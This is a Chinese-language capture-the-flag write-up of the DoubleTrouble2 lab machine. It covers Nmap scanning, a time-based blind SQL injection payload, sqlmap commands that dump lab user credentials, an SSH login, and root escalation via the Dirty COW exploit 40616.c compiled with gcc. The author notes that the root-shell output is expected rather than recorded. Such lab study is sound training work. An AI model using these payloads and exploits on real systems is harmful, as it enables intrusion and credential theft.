# DoubleTrouble2 靶机实战

## 一、靶机信息

| 项目     | 信息                       |
| -------- | -------------------------- |
| 靶机名称 | DoubleTrouble2             |
| 靶机 IP  | `172.20.10.4`              |
| 操作系统 | Debian GNU/Linux           |
| 内核版本 | `3.2.0-4-amd64`            |
| 攻击入口 | Web SQL 注入               |
| 初始权限 | clapton（普通用户）        |
| 最终权限 | root                       |
| 提权方式 | Dirty COW（CVE-2016-5195） |

## 二、信息收集

### 1. Nmap 端口扫描

```
nmap -sV -sC 172.20.10.4
```

扫描结果：

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.0p1 Debian 4+deb7u4
80/tcp open  http    Apache httpd 2.2.22 ((Debian))
```

发现两个开放端口：

- 22：SSH 服务，可以尝试通过获取的账号密码登录。
- 80：Apache Web 服务，进一步进行 Web 信息收集。

<img src=".\images\01.png" alt="01" style="zoom:33%;" />

<img src=".\images\02.png" alt="01" style="zoom:33%;" />

## 三、Web 信息收集与漏洞利用

### 1. SQL 注入检测

访问靶机 Web 页面，发现登录功能。

使用 sqlmap 对登录表单进行检测，发现 `uname` 参数存在时间盲注。

```
Parameter: uname (POST)

Type: time-based blind

Title: MySQL >= 5.0.12 AND time-based blind
(query SLEEP)

Payload:
uname=1' AND (SELECT 3174 FROM
(SELECT(SLEEP(5)))cDhW) AND 'oxJu'='oxJu
```

**漏洞分析：**

- 注入类型：时间盲注（Time-based Blind）。
- 数据库类型：MySQL。
- 注入位置：POST 参数 `uname`。
- 利用方式：通过 `SLEEP(5)` 制造响应时间差异，判断 SQL 查询结果。

### 2. 数据库信息枚举

使用 sqlmap 自动识别登录表单：

```
sqlmap -u "http://172.20.10.4/index.php" --forms --batch --dbs
```

发现目标数据库：

```
doubletrouble
```

### 3. 枚举数据库中的表

```
sqlmap -u "http://172.20.10.4/index.php" \
--forms --batch -D doubletrouble --tables
```

发现用户表：

```
users
```

### 4. 枚举 users 表字段

```
sqlmap -u "http://172.20.10.4/index.php" \
--forms --batch -D doubletrouble -T users --columns
```

### 5. 导出用户账号密码

```
sqlmap -u "http://172.20.10.4/index.php" \
--forms --batch -D doubletrouble -T users \
-C username,password --dump
```

获取结果：

| username | password |
| -------- | -------- |
| montreux | GfsZxc1  |
| clapton  | ZubZub99 |

至此，成功从数据库中获取用户凭据。

<img src=".\images\03.png" alt="01" style="zoom:33%;" />

## 四、获取 SSH Shell

### 1. SSH 登录

使用获取的账号密码尝试 SSH 登录。

```
ssh clapton@172.20.10.4
```

输入密码：

```
ZubZub99
```

登录成功，获得普通用户 Shell。

### 2. 查看当前用户权限

```
id
```

输出：

```
uid=1000(clapton) gid=1000(clapton) groups=1000(clapton)
```

当前用户：

```
clapton
```

权限为普通用户，接下来进行 Linux 本地提权。

<img src=".\images\04.png" alt="01" style="zoom:33%;" />

## 五、Linux 本地提权

### 1. 收集系统信息

查看内核版本：

```
uname -a
```

目标系统信息：

```
Linux doubletrouble 3.2.0-4-amd64
#1 SMP Debian 3.2.78-1 x86_64 GNU/Linux
```

关键判断：

- 操作系统：Debian。
- 内核版本：3.2.0-4-amd64。
- 系统架构：x86_64。
- 内核版本较老，存在尝试内核本地提权漏洞的可能。

### 2. SearchSploit 搜索漏洞

根据目标内核版本搜索可利用漏洞：

```
searchsploit linux kernel 3.2
```

筛选发现的漏洞，选择：

```
40616.c
```

该漏洞对应：

**Linux Kernel 2.6.22 < 3.9 - Dirty COW**

- 漏洞名称：Dirty COW
- CVE 编号：CVE-2016-5195
- 漏洞类型：本地权限提升
- 利用方式：利用 Linux 内核写时复制（COW）机制中的竞态条件，实现对只读映射内容的非预期修改。

参考资料：

https://www.exploit-db.com/exploits/40616

### 3. 利用 Dirty COW 提权

获取漏洞利用源码：

```
searchsploit -m linux/local/40616.c
```

将源码传输到靶机，在靶机上进行编译和执行。

**参考编译命令：**

```
gcc 40616.c -o cowroot -pthread
```

执行：

```
chmod +x cowroot
./cowroot
```

注意：以上为该漏洞的标准编译和执行方式，具体传输命令及实际执行输出需要根据本次操作记录补充。

<img src=".\images\05.png" alt="01" style="zoom:33%;" />

### 4. 验证提权结果

执行：

```
id
```

预期验证结果：

```
uid=0(root)
```

至此，成功获得 root 权限。

## 六、最终结果

| 阶段           | 结果                            |
| -------------- | ------------------------------- |
| 端口扫描       | 发现 SSH、HTTP                  |
| Web 漏洞发现   | uname 参数时间盲注              |
| 数据库信息收集 | 获取 doubletrouble.users        |
| 凭据获取       | 获取 montreux、clapton 账号密码 |
| 初始权限获取   | SSH 登录 clapton                |
| 本地提权       | Dirty COW（40616.c）            |
| 最终权限       | root                            |

## 七、实战总结

### 1. 本次涉及的知识点

- Nmap 端口扫描与服务识别
- SQL 时间盲注
- sqlmap 自动化检测与数据库枚举
- MySQL 数据库信息提取
- SSH 远程登录
- Linux 系统信息收集
- SearchSploit 漏洞检索
- Linux Kernel 本地提权
- Dirty COW（CVE-2016-5195）

### 2. 个人复盘

本次靶机主要分为两个阶段：

**第一阶段：Web 渗透**

通过 sqlmap 发现登录表单存在时间盲注，进一步枚举数据库、数据表及字段，最终提取出用户账号密码，并利用 SSH 获取初始 Shell。

**第二阶段：Linux 提权**

获得普通用户权限后，收集系统内核信息，发现目标运行较老版本的 Linux Kernel。通过 SearchSploit 查找对应漏洞，选择 Dirty COW（40616.c），最终完成 root 权限提升。

### 3. 关键命令

| 命令                     | 作用                    |
| ------------------------ | ----------------------- |
| `nmap -sV -sC`           | 端口及服务版本扫描      |
| `sqlmap --forms --dbs`   | 枚举数据库              |
| `sqlmap -D -T --columns` | 枚举数据表字段          |
| `sqlmap -C --dump`       | 导出指定字段数据        |
| `ssh user@IP`            | SSH 登录                |
| `id`                     | 查看当前用户权限        |
| `uname -a`               | 查看系统内核信息        |
| `searchsploit`           | 搜索公开漏洞利用代码    |
| `gcc`                    | 编译 C 语言漏洞利用程序 |